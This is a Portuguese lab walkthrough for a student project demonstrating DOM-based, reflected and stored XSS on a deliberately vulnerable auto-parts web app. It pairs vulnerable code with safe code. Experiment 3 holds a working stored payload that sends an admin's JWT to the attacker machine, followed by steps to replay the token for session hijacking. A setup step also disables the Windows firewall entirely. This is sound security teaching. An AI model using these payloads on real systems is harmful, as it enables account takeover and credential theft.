# Roteiro de Apresentação e Demonstração Prática dos Experimentos de XSS

Este roteiro é um guia passo a passo projetado para conduzir uma demonstração prática e apresentar com sucesso as vulnerabilidades de **Cross-Site Scripting (XSS)** no laboratório de testes do projeto **Autopeças JB**.

---

## 🛠️ Definição de Máquinas e Papéis no Laboratório

A demonstração utiliza duas máquinas conectadas na mesma rede local física ou Wi-Fi:

* **Computador 1 (Servidor / Vítima):** Hospeda a API Django (porta 8000) e o servidor Frontend (porta 5500). O administrador do sistema acessa o painel administrativo de chamados a partir deste computador (sendo a vítima do sequestro de sessão).
* **Computador 2 (Atacante / Cliente Comum):** Conecta-se à rede do Computador 1 para acessar a aplicação. Ele roda um servidor de escuta local (porta 8001) para coletar o token exfiltrado. O atacante injeta as cargas úteis (*payloads*) e realiza o sequestro de sessão (*session hijacking*) a partir desta máquina.

---

## 📅 PASSO 1: Configuração de Rede e Conectividade Local

Para interligar os dois computadores e permitir que eles se comuniquem, escolha uma das três opções abaixo:

### Opção A: Roteador Wi-Fi (Ponto de Acesso do Celular) — [RECOMENDADO]
Esta é a alternativa mais estável caso a rede local da instituição ou o Windows limite a criação de Hotspots virtuais sem acesso direto à Internet.
1. No seu celular, ative a função de **Roteador Wi-Fi (Ponto de Acesso / Hotspot Celular)**.
2. Conecte o **Computador 1** e o **Computador 2** nesta mesma rede sem fio criada.
3. No **Computador 1 (Servidor)**, abra o terminal (Prompt ou PowerShell) e execute `ipconfig`. Anote o **Endereço IPv4** (ex: `192.168.43.50`). Este será o `[IP_COMPUTADOR_1]`.
4. No **Computador 2 (Atacante)**, abra o terminal e execute `ipconfig`. Anote o **Endereço IPv4** (ex: `192.168.43.100`). Este será o `[IP_COMPUTADOR_2]`.

### Opção B: Hotspot Móvel do Windows (Computador 1)
1. No Windows do **Computador 1**, acesse **Configurações > Rede e Internet > Hotspot Móvel** e ative-o.
2. Defina o nome da rede (ex: `AutodefensoresXSS`) e a senha (ex: `12345678`).
3. Conecte o **Computador 2** na rede Wi-Fi criada pelo Computador 1.
4. O Computador 1 terá por padrão o IP **`192.168.137.1`** (`[IP_COMPUTADOR_1]`).
5. No **Computador 2**, abra o terminal, execute `ipconfig` e anote o IP atribuído à placa Wi-Fi (ex: `192.168.137.140`). Este será o `[IP_COMPUTADOR_2]`.

### Opção C: Cabo Ethernet Físico Direto (Contingência de Rede)
Se o Wi-Fi local estiver instável ou indisponível:
1. Conecte um cabo Ethernet RJ-45 direto entre as duas máquinas.
2. No **Computador 1 (Servidor)**: Vá em Conexões de Rede (`ncpa.cpl`), abra as propriedades de Ethernet > TCP/IPv4 e defina o IP estático como `192.168.1.1` (`[IP_COMPUTADOR_1]`) com máscara `255.255.255.0`.
3. No **Computador 2 (Atacante)**: Abra as propriedades de Ethernet > TCP/IPv4 e defina o IP estático como `192.168.1.2` (`[IP_COMPUTADOR_2]`) com máscara `255.255.255.0`.

---

## 🔒 PASSO 2: Configuração de Firewall e Regras de Portas

Para permitir que o Computador 2 (Atacante) envie dados à porta do Frontend/Backend do Computador 1, devemos criar regras de liberação de entrada no **Computador 1**.

No **Computador 1 (Servidor)**, abra o PowerShell como **Administrador** e execute:

* **Opção de Exceção (Segura):** Libera apenas as portas do laboratório:
  ```powershell
  New-NetFirewallRule -DisplayName "Lab XSS Ports" -Direction Inbound -LocalPort 5500,8000 -Protocol TCP -Action Allow
  ```
* **Opção de Desativação Temporária:** Desativa o Firewall do Windows Defender por completo (lembre-se de reativar alterando para `True` após a apresentação):
  ```powershell
  Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
  ```

---

## 🚀 PASSO 3: Inicialização dos Serviços nas Máquinas

### No Computador 1 (Servidor / Vítima)
Abra **duas janelas do terminal** separadas na raiz do projeto e execute:

1. **Terminal 1: Servidor do Frontend (Porta 5500)**
   ```powershell
   venv\Scripts\python.exe -m http.server 5500 --directory frontend
   ```
2. **Terminal 2: API Django Backend (Porta 8000)**
   ```powershell
   venv\Scripts\python.exe manage.py runserver 0.0.0.0:8000
   ```

*(Opcional: Se for demonstrar o fechamento de pedidos no carrinho, abra um terceiro terminal e inicie o microsserviço Flask na porta 8001: `venv\Scripts\python.exe pedidos_service/app.py`)*

### No Computador 2 (Atacante / Cliente Comum)
Abra **uma janela do terminal** (em qualquer diretório) e inicie o servidor simples de escuta para log na porta 8001:
```powershell
python -m http.server 8001
```
*Este comando nativo do Python cria um servidor HTTP simples na máquina do atacante. Qualquer requisição web recebida (como requisições fetch silenciosas disparadas por scripts XSS) será exibida e logada no console do terminal.*

---

## 🧪 PASSO 4: Execução Prática dos Experimentos

No navegador do **Computador 2 (Atacante)**, abra o seguinte endereço para acessar a aplicação:
```text
http://[IP_COMPUTADOR_1]:5500/
```

---

### 🔹 Experimento 1: DOM-Based XSS (Mensagem via Hash da URL)

#### O que demonstrar:
Como o JavaScript da aplicação lê parâmetros diretamente do navegador (*source*) e injeta na interface de maneira insegura (*sink*), sem que o código passe pelo servidor backend.

#### Passo a Passo:
1. Certifique-se de que a aplicação está no **Modo Vulnerável** usando o painel seletor no topo da página.
2. Modifique a URL no navegador do Computador 2 adicionando a âncora de hash:
   ```text
   http://[IP_COMPUTADOR_1]:5500/#mensagem=<img src=x onerror="alert('DOM XSS Ativo!')">
   ```
3. Pressione **Enter**.
4. **Resultado Esperado:** O navegador carrega a página localmente e renderiza a tag de imagem com erro de carregamento, ativando imediatamente a janela pop-up do `alert`.
5. **Mitigação:** Altere para o **Modo Seguro** no painel seletor de segurança e recarregue a URL com o mesmo hash.
6. **Comportamento Mitigado:** O script não é executado e o código do *payload* é exibido inofensivamente como texto simples no banner.

#### Análise e Explicação de Código (Vulnerável vs. Seguro):

No arquivo [pecas.js](file:///c:/Users/andre/Desktop/Estudos/Seguran%C3%A7a%20da%20Informa%C3%A7%C3%A3o/Projeto-web2-autopecas/frontend/js/pecas.js#L130), a função vulnerável `initDomXss()` lê a URL e a injeta diretamente no HTML:

```javascript
/* ---------------- CÓDIGO VULNERÁVEL ---------------- */
const hash = window.location.hash;
if (hash && hash.startsWith('#mensagem=')) {
    const text = decodeURIComponent(hash.substring('#mensagem='.length));
    banner.innerHTML = text; // SINK VULNERÁVEL: Permite a interpretação de tags HTML e scripts injetados.
}

/* ----------------- CÓDIGO SEGURO ------------------ */
const hash = window.location.hash;
if (hash && hash.startsWith('#mensagem=')) {
    const text = decodeURIComponent(hash.substring('#mensagem='.length));
    banner.textContent = text; // SINK SEGURO: A entrada é interpretada como string textual literal.
}
```
* **Explicação:** Propriedades como `.innerHTML` instruem o navegador a parsear a string fornecida como código HTML ativo. Já a propriedade `.textContent` (ou `.innerText`) realiza a renderização de caracteres especiais de forma higienizada, impedindo a inicialização do interpretador HTML.

---

### 🔹 Experimento 2: Reflected XSS (Mecanismo de Pesquisa)

#### O que demonstrar:
Como dados enviados em uma requisição HTTP (parâmetro de busca na URL) são refletidos na resposta HTML e renderizados no navegador do usuário de forma não persistente.

#### Passo a Passo:
1. Certifique-se de que a aplicação está em **Modo Vulnerável**.
2. Digite o seguinte *payload* na barra de pesquisa e pressione **Enter** (ou acesse diretamente a URL):
   ```text
   http://[IP_COMPUTADOR_1]:5500/index.html?q=<img src=x onerror="alert('Reflected XSS!')">
   ```
3. **Resultado Esperado:** O script inserido no parâmetro da URL é enviado e refletido imediatamente na tela de resultados do catálogo, disparando a execução do script.
4. **Mitigação:** Ative o **Modo Seguro** no seletor e atualize a página. O navegador impede a injeção, exibindo os caracteres especiais como texto bruto.

#### Análise e Explicação de Código (Vulnerável vs. Seguro):

No arquivo [pecas.js](file:///c:/Users/andre/Desktop/Estudos/Seguran%C3%A7a%20da%20Informa%C3%A7%C3%A3o/Projeto-web2-autopecas/frontend/js/pecas.js#L102), a query é exibida na tela de resultados da seguinte forma:

```javascript
/* ---------------- CÓDIGO VULNERÁVEL ---------------- */
// O parâmetro 'query' retirado da URL é injetado diretamente como HTML dinâmico.
resultsArea.innerHTML = `Resultados para: "<strong>${query}</strong>"`;

/* ----------------- CÓDIGO SEGURO ------------------ */
// O parâmetro de busca é renderizado de forma estritamente textual.
resultsArea.textContent = `Resultados para: "${query}"`;
```
* **Explicação:** A concatenação em `.innerHTML` abre margem para que qualquer tag HTML fornecida pela query string (URL) seja processada pelo navegador. A propriedade `.textContent` trata a busca puramente como dados literais.

---

### 🔹 Experimento 3: Stored XSS e Session Hijacking — [O CLÍMAX]

Este experimento demonstra um cenário realista onde o atacante envia um *payload* espião que é persistido no banco de dados e ativado silenciosamente no navegador de um administrador do sistema, exfiltrando seu token JWT de autenticação para a máquina do atacante.

#### Etapa A: O Login da Vítima (No Computador 1)
1. No navegador do **Computador 1 (Servidor)**, acesse `http://localhost:5500/`.
2. Faça login com a conta administrativa do superusuário (`admin`).
3. Navegue até a página administrativa restrita de chamados: `http://localhost:5500/admin_dashboard.html`.
4. Defina o seletor de segurança do painel para o **Modo Vulnerável**.

#### Etapa B: O Envio do Payload Invasor (No Computador 2)
1. No navegador do **Computador 2 (Atacante)**, acesse a página pública de suporte:
   ```text
   http://[IP_COMPUTADOR_1]:5500/suporte.html
   ```
2. Preencha os campos e insira o script espião no campo **Mensagem**, apontando para o seu próprio IP (`[IP_COMPUTADOR_2]`) na porta `8001`:
   ```html
   Solicitação urgente! <img src=x onerror="fetch('http://[IP_COMPUTADOR_2]:8001/log?token=' + localStorage.getItem('access_token'))">
   ```
3. Envie o formulário. O chamado contendo o *payload* malicioso foi salvo de forma persistente no banco de dados SQLite do servidor (Django).

#### Etapa C: A Execução Silenciosa do Ataque (No Computador 1)
1. No navegador do **Computador 1** (painel administrativo aberto pelo administrador legítimo).
2. Clique no botão **"Atualizar Chamados"** ou atualize a página.
3. O chamado persistido é carregado na tela. O navegador do administrador processa o HTML vulnerável e executa o script espião em segundo plano de forma invisível. O script captura o token `access_token` do `localStorage` do administrador e dispara um comando fetch de exfiltração via rede local.

#### Etapa D: A Interceptação do Token (No Computador 2)
1. No **Computador 2 (Atacante)**, observe o terminal onde o servidor de logs (`python -m http.server 8001`) está rodando.
2. Uma requisição de entrada contendo o JWT do Administrador aparecerá no log do console:
   ```text
   192.168.x.x - - [26/Jun/2026 01:15:22] "GET /log?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... HTTP/1.1" 404 -
   ```
3. Copie todo a string do token JWT que está após o parâmetro `token=`.

#### Etapa E: Executando o Session Hijacking (No Computador 2)
1. No navegador do **Computador 2 (Atacante)**, abra uma **janela anônima** e tente acessar diretamente o painel restrito de administração:
   ```text
   http://[IP_COMPUTADOR_1]:5500/admin_dashboard.html
   ```
   * *O painel exibirá o aviso vermelho de restrição de credenciais.*
2. Pressione **F12** no teclado, selecione a aba **Console** e injete o token roubado no armazenamento local do navegador da seguinte forma:
   ```javascript
   localStorage.setItem('access_token', 'SUA_STRING_DE_TOKEN_JWT_INTERCEPTADA')
   ```
3. Pressione **F5** para recarregar a página.
4. **Resultado Visual:** O painel de administração é exibido com sucesso para o atacante, concedendo acesso total à fila de chamados sem nunca exigir o conhecimento de usuário e senha.

#### Análise e Explicação de Código (Vulnerável vs. Seguro):

No arquivo [admin_dashboard.html](file:///c:/Users/andre/Desktop/Estudos/Seguran%C3%A7a%20da%20Informa%C3%A7%C3%A3o/Projeto-web2-autopecas/frontend/admin_dashboard.html#L188), os chamados vindos do banco de dados são renderizados na interface:

```javascript
/* ---------------- CÓDIGO VULNERÁVEL ---------------- */
// O chamado é injetado via innerHTML. As mensagens enviadas por clientes executam scripts no painel de administração.
card.innerHTML = `
    <div class="ticket-header">
        <span>Enviado por: ${ticket.cliente_nome} (${ticket.email})</span>
        <span>${new Date(ticket.criado_em).toLocaleString()}</span>
    </div>
    <div class="ticket-title">${ticket.assunto}</div>
    <div class="ticket-body">${ticket.mensagem}</div>
`;

/* ----------------- CÓDIGO SEGURO ------------------ */
// O cartão estrutural é criado e os dados dinâmicos são atribuídos via textContent de forma segura.
card.innerHTML = `
    <div class="ticket-header">
        <span class="ticket-client"></span>
        <span class="ticket-date"></span>
    </div>
    <div class="ticket-title"></div>
    <div class="ticket-body"></div>
`;
card.querySelector('.ticket-client').textContent = `Enviado por: ${ticket.cliente_nome} (${ticket.email})`;
card.querySelector('.ticket-date').textContent = new Date(ticket.criado_em).toLocaleString();
card.querySelector('.ticket-title').textContent = ticket.assunto;
card.querySelector('.ticket-body').textContent = ticket.mensagem; // DADO ESCAPADO
```
* **Explicação:** Como o banco de dados armazena os chamados sem sanitização na entrada (o que é uma falha secundária), o frontend deve atuar como barreira sanitária. Ao carregar a mensagem por meio de propriedades textuais (`textContent`), impedimos que o navegador interprete qualquer tag HTML gravada (como `<img onerror="...">` ou `<script>`).

---

## 🛠️ Guia de Resolução de Problemas (Troubleshooting)

* **O Computador 2 não carrega a página do Computador 1 (Time Out):**
  * *Causa:* O Firewall do Windows Defender no Computador 1 ainda está ativado e bloqueando as portas. Certifique-se de executar o comando de desativação temporária ou adicionar as regras de exceção descritas no Passo 2 com privilégios de Administrador.
  * *Causa:* Laptops corporativos costumam bloquear conexões de saída em portas não convencionais. Tente rotear a conexão usando o ponto de acesso Wi-Fi do celular em vez de redes compartilhadas ou corporativas.
* **O log do terminal no Computador 2 não mostra a requisição de exfiltração:**
  * *Causa:* Certifique-se de que o IP colocado no *payload* do chamado de suporte técnico corresponde exatamente ao IP de rede atual do **Computador 2** (Atacante) na porta `8001` (porta do servidor `python -m http.server 8001`).
